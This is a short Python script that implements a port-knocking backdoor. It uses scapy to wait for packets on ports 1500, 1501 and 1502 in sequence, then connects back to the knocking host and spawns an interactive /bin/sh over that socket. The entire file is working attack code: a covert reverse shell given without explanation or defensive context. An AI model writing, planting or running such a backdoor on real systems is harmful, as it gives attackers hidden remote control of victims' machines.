#! /usr/bin/python
import socket,subprocess,os
import sys
from scapy.all import *

def socreate (socip,socport):
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((socip, socport))
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	p=subprocess.call(['/bin/sh','-i'])


first_knock=sniff(filter="port 1500", count=2)
if first_knock[1]:
	print 'You got the first knock'

	second_knock=sniff(filter="port 1501", count=3)
	if second_knock[2]:
		print 'You got the second knock'

		third_knock=sniff(filter="port 1502", count=2)
		if third_knock[1]:
			print 'You got the third knock'
			ip=third_knock[1][IP].src
			port=third_knock[1][TCP].dport
			socreate(ip,port)		  
